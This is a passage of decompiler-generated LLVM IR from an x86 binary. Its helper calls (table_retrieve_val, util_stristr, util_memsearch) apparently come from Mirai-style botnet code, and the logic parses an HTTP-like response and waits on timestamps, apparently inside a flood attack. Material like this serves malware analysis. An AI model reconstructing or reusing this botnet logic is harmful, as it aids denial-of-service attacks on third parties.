  store i32 44, i32* %v2_8049f55, align 4
  %v3_8049f57 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049f57, i32* %eax.global-to-local, align 4
  %v0_8049f5c = load i32, i32* @esp, align 4
  %v9_8049f5c = icmp eq i32 %v0_8049f5c, -12
  store i1 %v9_8049f5c, i1* %zf.global-to-local, align 1
  %v2_8049f5f = add i32 %v0_8049f5c, 8
  %v3_8049f5f = inttoptr i32 %v2_8049f5f to i32*
  store i32 %v3_8049f57, i32* %v3_8049f5f, align 4
  %v1_8049f60 = add i32 %v0_8049f5c, 124
  %v2_8049f60 = inttoptr i32 %v1_8049f60 to i32*
  %v3_8049f60 = load i32, i32* %v2_8049f60, align 4
  store i32 %v3_8049f60, i32* @ebp, align 4
  %v2_8049f64 = add i32 %v0_8049f5c, 4
  %v3_8049f64 = inttoptr i32 %v2_8049f64 to i32*
  store i32 %v3_8049f60, i32* %v3_8049f64, align 4
  %v1_8049f65 = add i32 %v0_8049f5c, 147
  store i32 %v1_8049f65, i32* @edx, align 4
  %v3_8049f6c = inttoptr i32 %v0_8049f5c to i32*
  store i32 %v1_8049f65, i32* %v3_8049f6c, align 4
  %v4_8049f6d = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8049f72 = load i32, i32* @esp, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 16
  %v1_8049f75 = add i32 %v4_8049f6d, 1
  %v8_8049f75 = icmp eq i32 %v1_8049f75, 0
  store i1 %v8_8049f75, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f75, i32* %eax.global-to-local, align 4
  br i1 %v8_8049f75, label %dec_label_pc_804a163, label %dec_label_pc_8049f7c

dec_label_pc_8049f7c:                             ; preds = %dec_label_pc_8049f51
  %v0_8049f7c = load i32, i32* @esi, align 4
  %v2_8049f7c = add i32 %v0_8049f72, 12
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v0_8049f7c, i32* %v3_8049f7c, align 4
  %v0_8049f7d = load i32, i32* @esi, align 4
  %v2_8049f7d = add i32 %v0_8049f72, 8
  %v3_8049f7d = inttoptr i32 %v2_8049f7d to i32*
  store i32 %v0_8049f7d, i32* %v3_8049f7d, align 4
  %v1_8049f7e = add i32 %v0_8049f72, 4
  %v2_8049f7e = inttoptr i32 %v1_8049f7e to i32*
  store i32 0, i32* %v2_8049f7e, align 4
  %v2_8049f80 = inttoptr i32 %v0_8049f72 to i32*
  store i32 44, i32* %v2_8049f80, align 4
  %v3_8049f82 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049f82, i32* %eax.global-to-local, align 4
  %v0_8049f87 = load i32, i32* @esp, align 4
  %v9_8049f87 = icmp eq i32 %v0_8049f87, -12
  store i1 %v9_8049f87, i1* %zf.global-to-local, align 1
  %v2_8049f8a = add i32 %v0_8049f87, 8
  %v3_8049f8a = inttoptr i32 %v2_8049f8a to i32*
  store i32 %v3_8049f82, i32* %v3_8049f8a, align 4
  %v1_8049f8b = add i32 %v0_8049f87, 124
  %v2_8049f8b = inttoptr i32 %v1_8049f8b to i32*
  %v3_8049f8b = load i32, i32* %v2_8049f8b, align 4
  %v2_8049f8f = add i32 %v0_8049f87, 4
  %v3_8049f8f = inttoptr i32 %v2_8049f8f to i32*
  store i32 %v3_8049f8b, i32* %v3_8049f8f, align 4
  %v1_8049f90 = add i32 %v0_8049f87, 147
  store i32 %v1_8049f90, i32* @ecx, align 4
  %v3_8049f97 = inttoptr i32 %v0_8049f87 to i32*
  store i32 %v1_8049f90, i32* %v3_8049f97, align 4
  %v4_8049f98 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049f98, i32* %eax.global-to-local, align 4
  %v0_8049f9d = load i32, i32* @esp, align 4
  %v6_8049f9d = icmp eq i32 %v0_8049f9d, -16
  store i1 %v6_8049f9d, i1* %zf.global-to-local, align 1
  store i32 %v4_8049f98, i32* %ebx.global-to-local, align 4
  %v3_8049fa2 = add i32 %v4_8049f98, 147
  %v4_8049fa2 = add i32 %v3_8049fa2, %v0_8049f9d
  %v5_8049fa2 = inttoptr i32 %v4_8049fa2 to i8*
  %v6_8049fa2 = load i8, i8* %v5_8049fa2, align 1
  %v12_8049fa2 = icmp eq i8 %v6_8049fa2, 32
  %v1_8049faa = zext i1 %v12_8049fa2 to i32
  %v1_8049fad = add i32 %v0_8049f9d, 147
  store i32 %v1_8049fad, i32* %esi.global-to-local, align 4
  store i32 %v1_8049faa, i32* %eax.global-to-local, align 4
  %v1_8049fb9 = add i32 %v0_8049f9d, 12
  %v2_8049fb9 = inttoptr i32 %v1_8049fb9 to i32*
  store i32 2, i32* %v2_8049fb9, align 4
  %v1_8049fbb = add i32 %v0_8049f9d, 8
  %v2_8049fbb = inttoptr i32 %v1_8049fbb to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_8049fbb, align 4
  %v0_8049fc0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049fc0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049fc0 = add i32 %v1_8049fc0, %v0_8049fc0
  store i32 %v2_8049fc0, i32* @ebx, align 4
  %v1_8049fc2 = add i32 %v0_8049f9d, 124
  %v2_8049fc2 = inttoptr i32 %v1_8049fc2 to i32*
  %v3_8049fc2 = load i32, i32* %v2_8049fc2, align 4
  %v2_8049fc6 = sub i32 %v3_8049fc2, %v2_8049fc0
  store i32 %v2_8049fc6, i32* %eax.global-to-local, align 4
  %v0_8049fc8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049fc8 = add i32 %v0_8049fc8, %v2_8049fc0
  %v12_8049fc8 = icmp eq i32 %v2_8049fc8, 0
  store i1 %v12_8049fc8, i1* %zf.global-to-local, align 1
  store i32 %v2_8049fc8, i32* @esi, align 4
  %v2_8049fca = add i32 %v0_8049f9d, 4
  %v3_8049fca = inttoptr i32 %v2_8049fca to i32*
  store i32 %v2_8049fc6, i32* %v3_8049fca, align 4
  %v0_8049fcb = load i32, i32* @esi, align 4
  %v3_8049fcb = inttoptr i32 %v0_8049f9d to i32*
  store i32 %v0_8049fcb, i32* %v3_8049fcb, align 4
  %v4_8049fcc = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049fcc, i32* %eax.global-to-local, align 4
  %v0_8049fd1 = load i32, i32* @esp, align 4
  %v1_8049fd1 = add i32 %v0_8049fd1, 16
  store i32 %v4_8049fcc, i32* @ebp, align 4
  %v10_8049fd6 = icmp eq i32 %v4_8049fcc, -1
  store i1 %v10_8049fd6, i1* %zf.global-to-local, align 1
  br i1 %v10_8049fd6, label %dec_label_pc_804a163, label %dec_label_pc_8049fdf

dec_label_pc_8049fdf:                             ; preds = %dec_label_pc_8049f7c
  %v10_8049fdf = icmp eq i32 %v4_8049fcc, 1
  store i1 %v10_8049fdf, i1* %zf.global-to-local, align 1
  %v7_8049fe2 = icmp sgt i32 %v4_8049fcc, 1
  br i1 %v7_8049fe2, label %dec_label_pc_8049fe4, label %dec_label_pc_8049fe7

dec_label_pc_8049fe4:                             ; preds = %dec_label_pc_8049fdf
  %v1_8049fe4 = add i32 %v4_8049fcc, -2
  %v9_8049fe4 = icmp eq i32 %v1_8049fe4, 0
  store i1 %v9_8049fe4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049fe4, i32* @ebp, align 4
  br label %dec_label_pc_8049fe7

dec_label_pc_8049fe7:                             ; preds = %dec_label_pc_8049fdf, %dec_label_pc_8049fe4
  %v1_8049fe7 = add i32 %v0_8049fd1, 20920
  store i32 %v1_8049fe7, i32* %eax.global-to-local, align 4
  %v1_8049fee = add i32 %v0_8049fd1, 20916
  %v2_8049fee = inttoptr i32 %v1_8049fee to i32*
  store i32 0, i32* %v2_8049fee, align 4
  %v0_8049ff9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ff9 = load i32, i32* @ebp, align 4
  %v2_8049ff9 = add i32 %v1_8049ff9, %v0_8049ff9
  %v12_8049ff9 = icmp eq i32 %v2_8049ff9, 0
  store i1 %v12_8049ff9, i1* %zf.global-to-local, align 1
  store i32 %v2_8049ff9, i32* %eax.global-to-local, align 4
  %v0_8049ffb = load i32, i32* @ebx, align 4
  %v2_8049ffb = add i32 %v2_8049ff9, -20773
  %v3_8049ffb = add i32 %v2_8049ffb, %v0_8049ffb
  %v4_8049ffb = inttoptr i32 %v3_8049ffb to i8*
  store i8 0, i8* %v4_8049ffb, align 1
  %v0_804a003 = load i32, i32* @esi, align 4
  %v1_804a005 = inttoptr i32 %v0_804a003 to i8*
  %v2_804a005 = load i8, i8* %v1_804a005, align 1
  %v3_804a005 = zext i8 %v2_804a005 to i32
  %v4_804a005 = load i32, i32* @ecx, align 4
  %v5_804a005 = and i32 %v4_804a005, -256
  %v6_804a005 = or i32 %v5_804a005, %v3_804a005
  store i32 %v6_804a005, i32* %ecx.global-to-local, align 4
  %v1_804a007 = add i32 %v6_804a005, -48
  store i32 %v1_804a007, i32* %eax.global-to-local, align 4
  %v1_804a00a = trunc i32 %v1_804a007 to i8
  %v10_804a00a = icmp eq i8 %v1_804a00a, 9
  store i1 %v10_804a00a, i1* %zf.global-to-local, align 1
  %tmp173 = icmp ult i8 %v1_804a00a, 10
  br i1 %tmp173, label %dec_label_pc_804a00e, label %dec_label_pc_804a027

dec_label_pc_804a00e:                             ; preds = %dec_label_pc_8049fe7
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a013

dec_label_pc_804a013:                             ; preds = %dec_label_pc_804a013.dec_label_pc_804a013_crit_edge, %dec_label_pc_804a00e
  %v1_804a013 = phi i32 [ %v1_804a013.pre, %dec_label_pc_804a013.dec_label_pc_804a013_crit_edge ], [ %v0_804a003, %dec_label_pc_804a00e ]
  %v0_804a013 = phi i32 [ %v1_804a01d, %dec_label_pc_804a013.dec_label_pc_804a013_crit_edge ], [ 1, %dec_label_pc_804a00e ]
  %v2_804a013 = add i32 %v0_804a013, %v1_804a013
  store i32 %v2_804a013, i32* @ebx, align 4
  %v1_804a016 = load i32, i32* @esp, align 4
  %v2_804a016 = add i32 %v1_804a016, 20900
  %v3_804a016 = inttoptr i32 %v2_804a016 to i32*
  store i32 %v0_804a013, i32* %v3_804a016, align 4
  %v0_804a01d = load i32, i32* %edx.global-to-local, align 4
  %v1_804a01d = add i32 %v0_804a01d, 1
  %v8_804a01d = icmp eq i32 %v1_804a01d, 0
  store i1 %v8_804a01d, i1* %zf.global-to-local, align 1
  store i32 %v1_804a01d, i32* %edx.global-to-local, align 4
  %v0_804a01e = load i32, i32* @ebx, align 4
  %v1_804a01e = inttoptr i32 %v0_804a01e to i8*
  %v2_804a01e = load i8, i8* %v1_804a01e, align 1
  %v3_804a01e = zext i8 %v2_804a01e to i32
  %v4_804a01e = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a01e = and i32 %v4_804a01e, -256
  %v6_804a01e = or i32 %v5_804a01e, %v3_804a01e
  store i32 %v6_804a01e, i32* %ecx.global-to-local, align 4
  %v1_804a020 = add i32 %v6_804a01e, -48
  store i32 %v1_804a020, i32* %eax.global-to-local, align 4
  %v1_804a023 = trunc i32 %v1_804a020 to i8
  %v10_804a023 = icmp eq i8 %v1_804a023, 9
  store i1 %v10_804a023, i1* %zf.global-to-local, align 1
  %tmp174 = icmp ult i8 %v1_804a023, 10
  br i1 %tmp174, label %dec_label_pc_804a013.dec_label_pc_804a013_crit_edge, label %dec_label_pc_804a027

dec_label_pc_804a013.dec_label_pc_804a013_crit_edge: ; preds = %dec_label_pc_804a013
  %v1_804a013.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a013

dec_label_pc_804a027:                             ; preds = %dec_label_pc_804a013, %dec_label_pc_8049fe7
  %v0_804a02f = phi i32 [ %v0_804a003, %dec_label_pc_8049fe7 ], [ %v0_804a01e, %dec_label_pc_804a013 ]
  %v0_804a027 = phi i32 [ %v6_804a005, %dec_label_pc_8049fe7 ], [ %v6_804a01e, %dec_label_pc_804a013 ]
  %v3_804a027 = trunc i32 %v0_804a027 to i8
  %v4_804a027 = icmp eq i8 %v3_804a027, 0
  store i1 %v4_804a027, i1* %zf.global-to-local, align 1
  br i1 %v4_804a027, label %dec_label_pc_804a027.dec_label_pc_804a163_crit_edge, label %dec_label_pc_804a02f

dec_label_pc_804a027.dec_label_pc_804a163_crit_edge: ; preds = %dec_label_pc_804a027
  %v0_804a163.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a163

dec_label_pc_804a02f:                             ; preds = %dec_label_pc_804a027
  %v1_804a02f = inttoptr i32 %v0_804a02f to i8*
  store i8 0, i8* %v1_804a02f, align 1
  %v0_804a032 = load i32, i32* @esp, align 4
  %v1_804a032 = add i32 %v0_804a032, 20900
  %v2_804a032 = inttoptr i32 %v1_804a032 to i32*
  %v3_804a032 = load i32, i32* %v2_804a032, align 4
  store i32 %v3_804a032, i32* %edx.global-to-local, align 4
  %v1_804a039 = add i32 %v3_804a032, 1
  store i32 %v1_804a039, i32* %eax.global-to-local, align 4
  store i32 %v1_804a039, i32* %v2_804a032, align 4
  %v0_804a043 = load i32, i32* @esi, align 4
  %v1_804a043 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a043 = add i32 %v1_804a043, %v0_804a043
  %v3_804a043 = inttoptr i32 %v2_804a043 to i8*
  %v4_804a043 = load i8, i8* %v3_804a043, align 1
  %v10_804a043 = icmp eq i8 %v4_804a043, 32
  store i1 %v10_804a043, i1* %zf.global-to-local, align 1
  br i1 %v10_804a043, label %dec_label_pc_804a441, label %dec_label_pc_804a04d

dec_label_pc_804a04d:                             ; preds = %dec_label_pc_804a02f, %dec_label_pc_804a441
  %v0_804a050 = phi i32 [ %v0_804a043, %dec_label_pc_804a02f ], [ %v0_804a050.pre, %dec_label_pc_804a441 ]
  %v0_804a04d = load i32, i32* @esp, align 4
  store i32 %v0_804a050, i32* %eax.global-to-local, align 4
  %v1_804a052 = add i32 %v0_804a04d, 20900
  %v2_804a052 = inttoptr i32 %v1_804a052 to i32*
  %v3_804a052 = load i32, i32* %v2_804a052, align 4
  store i32 %v3_804a052, i32* @ecx, align 4
  %v2_804a059 = add i32 %v3_804a052, %v0_804a050
  %v12_804a059 = icmp eq i32 %v2_804a059, 0
  store i1 %v12_804a059, i1* %zf.global-to-local, align 1
  store i32 %v2_804a059, i32* %eax.global-to-local, align 4
  %v2_804a05b = add i32 %v0_804a04d, -16
  %v3_804a05b = inttoptr i32 %v2_804a05b to i32*
  store i32 %v2_804a059, i32* %v3_804a05b, align 4
  %v2_804a05c = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a05c, i32* %eax.global-to-local, align 4
  %v0_804a061 = load i32, i32* @esp, align 4
  %v1_804a064 = add i32 %v0_804a061, 8
  %v2_804a064 = inttoptr i32 %v1_804a064 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055870.23 to i32), i32* %v2_804a064, align 4
  %v2_804a069 = add i32 %v0_804a061, 4
  %v3_804a069 = inttoptr i32 %v2_804a069 to i32*
  store i32 %v2_804a05c, i32* %v3_804a069, align 4
  %v1_804a06a = add i32 %v0_804a061, 20916
  %v2_804a06a = inttoptr i32 %v1_804a06a to i32*
  %v3_804a06a = load i32, i32* %v2_804a06a, align 4
  store i32 %v3_804a06a, i32* @edx, align 4
  %v0_804a071 = load i32, i32* @esi, align 4
  %v2_804a073 = add i32 %v0_804a071, %v3_804a06a
  %v12_804a073 = icmp eq i32 %v2_804a073, 0
  store i1 %v12_804a073, i1* %zf.global-to-local, align 1
  store i32 %v2_804a073, i32* %eax.global-to-local, align 4
  %v3_804a075 = inttoptr i32 %v0_804a061 to i32*
  store i32 %v2_804a073, i32* %v3_804a075, align 4
  %v4_804a076 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_804a07b = load i32, i32* @esp, align 4
  %v1_804a07b = add i32 %v0_804a07b, 16
  %v1_804a07e = add i32 %v4_804a076, 1
  %v8_804a07e = icmp eq i32 %v1_804a07e, 0
  store i1 %v8_804a07e, i1* %zf.global-to-local, align 1
  store i32 %v1_804a07e, i32* %eax.global-to-local, align 4
  br i1 %v8_804a07e, label %dec_label_pc_804a0c2, label %dec_label_pc_804a081

dec_label_pc_804a081:                             ; preds = %dec_label_pc_804a04d
  %v0_804a084 = load i32, i32* @esi, align 4
  store i32 %v0_804a084, i32* %eax.global-to-local, align 4
  %v1_804a086 = add i32 %v0_804a07b, 20916
  %v2_804a086 = inttoptr i32 %v1_804a086 to i32*
  %v3_804a086 = load i32, i32* %v2_804a086, align 4
  %v2_804a08d = add i32 %v3_804a086, %v0_804a084
  %v12_804a08d = icmp eq i32 %v2_804a08d, 0
  store i1 %v12_804a08d, i1* %zf.global-to-local, align 1
  store i32 %v2_804a08d, i32* %eax.global-to-local, align 4
  %v3_804a08f = inttoptr i32 %v0_804a07b to i32*
  store i32 %v2_804a08d, i32* %v3_804a08f, align 4
  %v2_804a090 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a090, i32* %eax.global-to-local, align 4
  %v0_804a095 = load i32, i32* @esp, align 4
  %v1_804a098 = add i32 %v0_804a095, 8
  %v2_804a098 = inttoptr i32 %v1_804a098 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055870.23 to i32), i32* %v2_804a098, align 4
  %v2_804a09d = add i32 %v0_804a095, 4
  %v3_804a09d = inttoptr i32 %v2_804a09d to i32*
  store i32 %v2_804a090, i32* %v3_804a09d, align 4
  %v1_804a09e = add i32 %v0_804a095, 20916
  %v2_804a09e = inttoptr i32 %v1_804a09e to i32*
  %v3_804a09e = load i32, i32* %v2_804a09e, align 4
  store i32 %v3_804a09e, i32* @ecx, align 4
  %v0_804a0a5 = load i32, i32* @esi, align 4
  %v2_804a0a7 = add i32 %v0_804a0a5, %v3_804a09e
  %v12_804a0a7 = icmp eq i32 %v2_804a0a7, 0
  store i1 %v12_804a0a7, i1* %zf.global-to-local, align 1
  store i32 %v2_804a0a7, i32* %eax.global-to-local, align 4
  %v3_804a0a9 = inttoptr i32 %v0_804a095 to i32*
  store i32 %v2_804a0a7, i32* %v3_804a0a9, align 4
  %v4_804a0aa = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a0aa, i32* %eax.global-to-local, align 4
  %v0_804a0af = load i32, i32* @esp, align 4
  %v1_804a0af = add i32 %v0_804a0af, 20916
  %v2_804a0af = inttoptr i32 %v1_804a0af to i32*
  %v3_804a0af = load i32, i32* %v2_804a0af, align 4
  %v2_804a0b6 = add i32 %v3_804a0af, %v4_804a0aa
  store i32 %v2_804a0b6, i32* %edx.global-to-local, align 4
  store i32 %v2_804a0b6, i32* %v2_804a0af, align 4
  %v0_804a0bf = load i32, i32* @esp, align 4
  %v1_804a0bf = add i32 %v0_804a0bf, 16
  %v6_804a0bf = icmp eq i32 %v1_804a0bf, 0
  store i1 %v6_804a0bf, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a0c2

dec_label_pc_804a0c2:                             ; preds = %dec_label_pc_804a04d, %dec_label_pc_804a081
  %v1_804a4cb = phi i32 [ %v1_804a07b, %dec_label_pc_804a04d ], [ %v1_804a0bf, %dec_label_pc_804a081 ]
  %v1_804a0c2 = add i32 %v1_804a4cb, 20900
  %v2_804a0c2 = inttoptr i32 %v1_804a0c2 to i32*
  %v3_804a0c2 = load i32, i32* %v2_804a0c2, align 4
  store i32 %v3_804a0c2, i32* @eax, align 4
  %v0_804a0c9 = load i32, i32* @esi, align 4
  %v2_804a0c9 = add i32 %v0_804a0c9, %v3_804a0c2
  %v3_804a0c9 = inttoptr i32 %v2_804a0c9 to i8*
  %v4_804a0c9 = load i8, i8* %v3_804a0c9, align 1
  %v13_804a0c9 = icmp eq i8 %v4_804a0c9, 34
  store i1 %v13_804a0c9, i1* %zf.global-to-local, align 1
  br i1 %v13_804a0c9, label %dec_label_pc_804a4c8, label %dec_label_pc_804a0d3

dec_label_pc_804a0d3:                             ; preds = %dec_label_pc_804a4c8, %dec_label_pc_804a0c2, %dec_label_pc_804a4ec
  %v1_804a0d3 = phi i32 [ %v1_804a4de, %dec_label_pc_804a4c8 ], [ %v1_804a4cb, %dec_label_pc_804a0c2 ], [ %v1_804a0d3.pre, %dec_label_pc_804a4ec ]
  %v0_804a0d3 = phi i32 [ %v2_804a4d9, %dec_label_pc_804a4c8 ], [ %v3_804a0c2, %dec_label_pc_804a0c2 ], [ %v0_804a0d3.pre, %dec_label_pc_804a4ec ]
  %v2_804a0d3 = add i32 %v1_804a0d3, -4
  %v3_804a0d3 = inttoptr i32 %v2_804a0d3 to i32*
  store i32 %v0_804a0d3, i32* %v3_804a0d3, align 4
  %v0_804a0d4 = load i32, i32* @eax, align 4
  %v2_804a0d4 = add i32 %v1_804a0d3, -8
  %v3_804a0d4 = inttoptr i32 %v2_804a0d4 to i32*
  store i32 %v0_804a0d4, i32* %v3_804a0d4, align 4
  %v1_804a0d5 = add i32 %v1_804a0d3, -12
  %v2_804a0d5 = inttoptr i32 %v1_804a0d5 to i32*
  store i32 10, i32* %v2_804a0d5, align 4
  %v0_804a0d7 = load i32, i32* @esi, align 4
  %v2_804a0d7 = add i32 %v1_804a0d3, -16
  %v3_804a0d7 = inttoptr i32 %v2_804a0d7 to i32*
  store i32 %v0_804a0d7, i32* %v3_804a0d7, align 4
  %v3_804a0d8 = call i32 @util_atoi(i8* %v1_8048f9a, i32 %v3_8048a9f)
  %v0_804a0dd = load i32, i32* @esp, align 4
  %v1_804a0dd = add i32 %v0_804a0dd, 16
  store i32 %v3_804a0d8, i32* %edx.global-to-local, align 4
  %v1_804a0e2 = add i32 %v3_804a0d8, -1
  store i32 %v1_804a0e2, i32* %eax.global-to-local, align 4
  %v9_804a0e5 = icmp eq i32 %v3_804a0d8, 9
  store i1 %v9_804a0e5, i1* %zf.global-to-local, align 1
  %v6_804a0e8 = icmp ugt i32 %v1_804a0e2, 8
  br i1 %v6_804a0e8, label %dec_label_pc_804a111, label %dec_label_pc_804a0ea

dec_label_pc_804a0ea:                             ; preds = %dec_label_pc_804a0d3
  %v1_804a0ea = add i32 %v0_804a0dd, 72
  %v2_804a0ea = inttoptr i32 %v1_804a0ea to i32*
  %v3_804a0ea = load i32, i32* %v2_804a0ea, align 4
  store i32 %v3_804a0ea, i32* %eax.global-to-local, align 4
  %v2_804a0ee = add i32 %v3_804a0ea, %v3_804a0d8
  store i32 %v2_804a0ee, i32* @ebx, align 4
  %v9_804a100143 = icmp eq i32 %v1_804a0dd, 12
  store i1 %v9_804a100143, i1* %zf.global-to-local, align 1
  %v2_804a103145 = inttoptr i32 %v0_804a0dd to i32*
  store i32 0, i32* %v2_804a103145, align 4
  %v2_804a105146 = call i32 @__GI_time(i32* %v1_8048c1f)
  store i32 %v2_804a105146, i32* %eax.global-to-local, align 4
  %v0_804a10a147 = load i32, i32* @esp, align 4
  %v1_804a10a148 = add i32 %v0_804a10a147, 16
  %v0_804a10d149 = load i32, i32* @ebx, align 4
  %v12_804a10d150 = icmp eq i32 %v0_804a10d149, %v2_804a105146
  store i1 %v12_804a10d150, i1* %zf.global-to-local, align 1
  %tmp175 = icmp ugt i32 %v0_804a10d149, %v2_804a105146
  br i1 %tmp175, label %dec_label_pc_804a0f3, label %dec_label_pc_804a111

dec_label_pc_804a0f3:                             ; preds = %dec_label_pc_804a0ea, %dec_label_pc_804a0f3
  %v0_804a10a151 = phi i32 [ %v0_804a10a, %dec_label_pc_804a0f3 ], [ %v0_804a10a147, %dec_label_pc_804a0ea ]
  %v9_804a0f3 = icmp eq i32 %v0_804a10a151, -4
  store i1 %v9_804a0f3, i1* %zf.global-to-local, align 1
  %v2_804a0f6 = inttoptr i32 %v0_804a10a151 to i32*
  store i32 1, i32* %v2_804a0f6, align 4
  %v1_804a0f8 = call i32 @sleep(i32 %stack_var_-20888.0)
  store i32 %v1_804a0f8, i32* %eax.global-to-local, align 4
  %v0_804a0fd = load i32, i32* @esp, align 4
  %v9_804a100 = icmp eq i32 %v0_804a0fd, -4
  store i1 %v9_804a100, i1* %zf.global-to-local, align 1
  %v2_804a103 = inttoptr i32 %v0_804a0fd to i32*
  store i32 0, i32* %v2_804a103, align 4
  %v2_804a105 = call i32 @__GI_time(i32* %v1_8048c1f)
  store i32 %v2_804a105, i32* %eax.global-to-local, align 4
  %v0_804a10a = load i32, i32* @esp, align 4
  %v1_804a10a = add i32 %v0_804a10a, 16
  %v0_804a10d = load i32, i32* @ebx, align 4
  %v12_804a10d = icmp eq i32 %v0_804a10d, %v2_804a105
  store i1 %v12_804a10d, i1* %zf.global-to-local, align 1
  %tmp176 = icmp ugt i32 %v0_804a10d, %v2_804a105
  br i1 %tmp176, label %dec_label_pc_804a0f3, label %dec_label_pc_804a111

dec_label_pc_804a111:                             ; preds = %dec_label_pc_804a0ea, %dec_label_pc_804a0f3, %dec_label_pc_804a0d3
  %v0_804a11a = phi i32 [ %v1_804a0dd, %dec_label_pc_804a0d3 ], [ %v1_804a10a148, %dec_label_pc_804a0ea ], [ %v1_804a10a, %dec_label_pc_804a0f3 ]
  %v1_804a111 = add i32 %v0_804a11a, 20900
  %v2_804a111 = inttoptr i32 %v1_804a111 to i32*
  %v3_804a111 = load i32, i32* %v2_804a111, align 4
  store i32 %v3_804a111, i32* %eax.global-to-local, align 4
  %v0_804a118 = load i32, i32* @esi, align 4
  %v2_804a11d = add i32 %v0_804a118, %v3_804a111
  %v12_804a11d = icmp eq i32 %v2_804a11d, 0
  store i1 %v12_804a11d, i1* %zf.global-to-local, align 1
  store i32 %v2_804a11d, i32* @ebx, align 4
  %v2_804a11f = add i32 %v0_804a11a, -16
  %v3_804a11f = inttoptr i32 %v2_804a11f to i32*
  store i32 %v2_804a11d, i32* %v3_804a11f, align 4
  %v2_804a120 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a120, i32* %eax.global-to-local, align 4
  %v0_804a125 = load i32, i32* @esp, align 4
  %v9_804a125 = icmp eq i32 %v0_804a125, -12
  store i1 %v9_804a125, i1* %zf.global-to-local, align 1
  %v1_804a128 = add i32 %v0_804a125, 8
  %v2_804a128 = inttoptr i32 %v1_804a128 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805586b.22 to i32), i32* %v2_804a128, align 4
  %v2_804a12d = add i32 %v0_804a125, 4
  %v3_804a12d = inttoptr i32 %v2_804a12d to i32*
  store i32 %v2_804a120, i32* %v3_804a12d, align 4
  %v0_804a12e = load i32, i32* @ebx, align 4
  %v3_804a12e = inttoptr i32 %v0_804a125 to i32*
  store i32 %v0_804a12e, i32* %v3_804a12e, align 4
  %v4_804a12f = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a12f, i32* %eax.global-to-local, align 4
  %v0_804a134 = load i32, i32* @esp, align 4
  %v1_804a134 = add i32 %v0_804a134, 16
  %v9_804a137 = icmp eq i32 %v4_804a12f, 4
  store i1 %v9_804a137, i1* %zf.global-to-local, align 1
  br i1 %v9_804a137, label %dec_label_pc_804a450, label %dec_label_pc_804a140

dec_label_pc_804a140:                             ; preds = %dec_label_pc_804a111
  %v0_804a140 = load i32, i32* @ebx, align 4
  %v1_804a140 = inttoptr i32 %v0_804a140 to i8*
  %v2_804a140 = load i8, i8* %v1_804a140, align 1
  %v11_804a140 = icmp eq i8 %v2_804a140, 47
  store i1 %v11_804a140, i1* %zf.global-to-local, align 1
  br i1 %v11_804a140, label %dec_label_pc_804a3c0, label %dec_label_pc_804a149

dec_label_pc_804a149:                             ; preds = %dec_label_pc_804a3e3, %dec_label_pc_804a3c0, %dec_label_pc_804a140, %dec_label_pc_804a417
  %v0_804a149 = phi i32 [ %v1_804a40c, %dec_label_pc_804a3e3 ], [ %v1_804a3d5, %dec_label_pc_804a3c0 ], [ %v1_804a134, %dec_label_pc_804a140 ], [ %v1_804a429, %dec_label_pc_804a417 ]
  %v1_804a149 = add i32 %v0_804a149, 96
  %v2_804a149 = inttoptr i32 %v1_804a149 to i32*
  %v3_804a149 = load i32, i32* %v2_804a149, align 4
  store i32 %v3_804a149, i32* %edx.global-to-local, align 4
  %v0_804a14d = load i32, i32* @edi, align 4
  %v1_804a14d = add i32 %v0_804a14d, -1448
  %v2_804a14d = inttoptr i32 %v1_804a14d to i8*
  store i8 10, i8* %v2_804a14d, align 1
  %v0_804a154 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a154 = add i32 %v0_804a154, 1431
  %v2_804a154 = inttoptr i32 %v1_804a154 to i32*
  store i32 5522759, i32* %v2_804a154, align 4
  br label %dec_label_pc_8048e80

dec_label_pc_804a163:                             ; preds = %dec_label_pc_804a027.dec_label_pc_804a163_crit_edge, %dec_label_pc_8049f7c, %dec_label_pc_8049f51
  %v0_804a163 = phi i32 [ %v0_804a163.pre, %dec_label_pc_804a027.dec_label_pc_804a163_crit_edge ], [ %v1_8049fd1, %dec_label_pc_8049f7c ], [ %v1_8049f72, %dec_label_pc_8049f51 ]
  %v1_804a163 = add i32 %v0_804a163, -4
  %v2_804a163 = inttoptr i32 %v1_804a163 to i32*
  store i32 4, i32* %v2_804a163, align 4
  %v1_804a165 = add i32 %v0_804a163, -8
